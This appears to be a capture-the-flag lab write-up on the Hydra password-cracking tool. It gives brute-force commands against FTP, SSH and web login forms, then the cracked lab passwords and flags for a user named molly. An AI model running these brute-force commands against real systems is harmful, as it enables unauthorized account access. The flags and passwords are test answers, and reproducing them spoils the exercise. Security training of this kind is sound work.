# Hydra

* Hydra is a brute force online password cracking program; a quick system login password 'hacking' tool.

> More about hydra [here](https://en.kali.tools/?p=220)

## Hydra Commands


* Bruteforce FTP with the username being user and a password list being passlist.txt, we'd use the following command:

```bash
hydra -l user -P passlist.txt ftp://10.10.72.0
```

* SSH

```bash
hydra -l <username> -P <full path to pass> @IP -t 4 ssh
```

|Option|Description|
|---|---|
|-l|the username|
|-P|Use a list of passwords|
|-t|Number of threads to use|

* POST Web Form

```bash
hydra -l <username> -P <wordlist> @IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

|Option|Description|
|---|---|
|-l|Single username|
|-P|Password list|
|http-post-form|Type of the form (post)|
|/login url|Login page URL|
|:username|form field where username entered|
|^USER^|tells hydra to use the username|
|^PASS^|tells hydra to use the password list supplied|
|Login|tell Hydra the login field message|
|Login failed|is the login failued message that the form returns|
|F=incorrect|if the word appears on the page, it's incorrect|
|-V|verbose ouput for every attempt|

1. Use Hydra to bruteforce molly's web password. What is flag 1?

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.72.0 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V
# password: sunshine
```

```
THM{2673a7dd116de68e85c48ec0b1f2612e}
```

2. Use Hydra to bruteforce molly's SSH password. What is flag 2?

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.72.0 -t 4 ssh
# password: butterfly
```

```
THM{c8eeb0468febbadea859baeb33b2541b}
```